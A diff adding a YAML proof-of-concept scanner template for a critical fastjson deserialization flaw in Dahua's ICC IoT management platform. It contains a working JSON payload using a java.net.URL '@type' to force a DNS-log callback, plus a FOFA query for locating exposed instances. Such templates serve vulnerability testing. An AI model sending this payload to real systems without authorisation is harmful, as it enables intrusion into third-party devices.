@@ -1,0 +1,27 @@
+id: poc-yaml-dahua-icc-random-unserialize
+info:
+  name: 大华ICC智能物联综合管理平台 random 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="*客户端会小于800*"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /evo-runs/v1.0/auths/sysusers/random
+  headers:
+    Content-Type: application/json
+  data: "{\n\"a\":{\n  \"@type\":\"com.alibaba.fastjson.JSONObject\",\n  {\"@type\"\
+    :\"java.net.URL\",\"val\":\"http://{{.domain}}\"}\n  }\"\"\n}"
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"success\":false") &&
+
+    reverse.Verify()
+
+    '
+transport: http
